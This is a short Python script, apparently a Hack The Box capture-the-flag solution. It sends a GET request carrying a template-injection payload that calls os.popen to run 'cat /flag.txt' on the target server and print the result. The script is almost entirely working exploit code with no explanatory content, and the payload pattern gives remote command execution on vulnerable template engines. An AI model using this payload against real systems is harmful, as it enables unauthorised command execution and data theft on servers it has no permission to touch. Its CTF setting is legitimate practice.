#!/usr/bin/env python3

import requests

def make_get_request(url, params=None):
    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            print("Request successful!")
            print("Response content:")
            print(response.text)
        else:
            print(f"Error: {response.status_code} - {response.text}")

    except requests.RequestException as e:
        print(f"Request failed: {e}")

if __name__ == "__main__":
    base_url = 'http://<ip>:<port>/'
    parameter_name = 'text'
    parameter_value = '${self.module.cache.util.os.popen("cat+/flag.txt").read()}'
    full_url = f"{base_url}?{parameter_name}={parameter_value}"
    make_get_request(full_url)

#chmod +x gethatflag.py
#./getheflag.py | grep -oE HTB{.*}